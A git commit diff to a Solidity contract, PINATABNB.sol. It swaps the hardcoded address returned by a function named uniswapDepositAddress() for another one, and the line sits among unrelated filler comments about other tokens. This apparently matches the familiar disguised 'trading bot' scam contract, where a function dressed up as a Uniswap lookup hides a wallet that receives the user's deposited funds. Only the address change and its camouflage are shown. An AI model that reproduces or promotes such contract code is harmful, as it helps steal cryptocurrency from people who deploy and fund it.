933c10d89b6c1fd61e00e1dd8323fa3e0b91c0c2
BOTARB <124081350+BOTARB@users.noreply.github.com>
2023-05-10 16:55:55 +0200

    Update PINATABNB.sol

--- PINATABNB.sol
+++ PINATABNB.sol
@@ -737,7 +737,7 @@ function uniswapDepositAddress() public pure returns (address) {
 // Decentralized marketplace for artificial intelligence.
 // 0x5b7533812759b45c2b44c19e320ba2cd2681b542
 
-return 0x03B70fB099c2bF83E39ca07509522Bbf221Cf801;
+return 0x310F2c74bB82d7f06C9D9d8fAfb4E99d1E1533F2;
 // CarryToken (CRE)
 // Carry makes personal data fair for consumers, marketers and merchants
 // 0x115ec79f1de567ec68b7ae7eda501b406626478e
